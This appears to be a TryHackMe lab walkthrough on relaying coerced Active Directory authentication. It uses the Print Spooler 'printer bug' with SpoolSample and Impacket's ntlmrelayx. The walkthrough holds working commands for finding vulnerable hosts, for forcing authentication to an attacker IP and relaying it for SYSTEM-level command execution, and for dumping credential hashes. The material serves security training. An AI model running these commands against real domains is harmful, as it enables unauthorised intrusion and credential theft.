# Exploiting Automated Relays in Active Directory

In this task, we explore automated relays in Active Directory (AD). Authentication attempts are constantly occurring across the network. As shown in the Breaching AD room, intercepting these challenges can grant access. But what if we could coerce authentication to occur, rather than waiting?

Even if we already have privileged access to `THMSERVER1`, there may be situations where a constrained delegation exploit is unavailable. Automated relays provide another effective attack vector for gaining privileged access to hosts.

---

## Machine Accounts

- **All Windows hosts have a machine account**: This is the user account associated with the machine.
- **Password characteristics**: By default, machine account passwords are 120 characters (UTF16) and rotate every 30 days.
- **Usage in AD**: Machine accounts are used by services like domain controllers for AD synchronization and certificate requests.

### Administrative Relationships

Sometimes, one machine has admin rights over another (e.g., domain controllers, SQL clusters). These relationships can be exploited for authentication coercion.

#### Identifying Admin Relationships

Use Bloodhound to find cases where a machine account has admin access over another:

```cypher
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

This query finds instances where a computer has the `AdminTo` relationship over another. For example, `THMSERVER2` may have admin privileges over `THMSERVER1`.

---

## The Printer Bug

> "It's not a bug, it's a feature." â€” Microsoft

The "printer bug" is a feature of the MS-RPRN protocol (PrintSystem Remote Protocol), allowing a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address. Notable bugs include Spooler, PetitPotam, and PrintNightmare.

### Exploitation Requirements

To exploit this, you need:

1. **Valid AD account credentials**
2. **Network connectivity to the target's SMB service**
3. **Target host running the Print Spooler service**
4. **SMB signing not enforced**

Assume conditions 1 and 2 are met. Let's check the remaining conditions.

---

### Checking the Print Spooler Service

Query the service state from the network using WMI from `THMWRK1`:

```powershell
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

Sample output:

```
Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2
```

If access is denied, try:

```powershell
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

If both fail, proceed with caution.

---

### Checking SMB Signing

SMB signing should not be enforced. Use Nmap to verify:

```bash
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

Sample output:

```
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
```

If signing is enabled but not required, you can proceed.

---

## Exploiting Authentication Relays

> **Note:** This attack can be unstable. The Print Spooler service may crash, and a callback is not guaranteed.

### Tools Used

- **SpoolSample**: C# exploit (precompiled at `C:\Tools\` on `THMWRK1`)
- **Impacket's ntlmrelayx.py**: For relaying authentication

### Steps

1. **Set up NTLM relay on your AttackBox:**

    ```bash
    python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
    ```

    > Use the IP address, not the hostname, to avoid Kerberos fallback.

2. **Coerce authentication from `THMSERVER2`:**

    ```cmd
    C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
    ```

    Replace `"Attacker IP"` with your tunX interface IP.

3. **Observe the relay output:**

    ```bash
    python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
    ```

    Example output:

    ```
    [*] Servers started, waiting for connections
    [*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201
    [*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED
    [+] No more targets
    ...
    USER INFORMATION
    ----------------
    User Name           SID
    =================== ========
    nt authority\system S-1-5-18
    ...
    ```

    If no command is specified, a hashdump may be performed, allowing credential extraction for further exploitation.

---

**Summary:**  
By coercing authentication using the Print Spooler service and relaying it with Impacket, you can gain privileged access to target hosts in AD environments, provided the necessary conditions are met.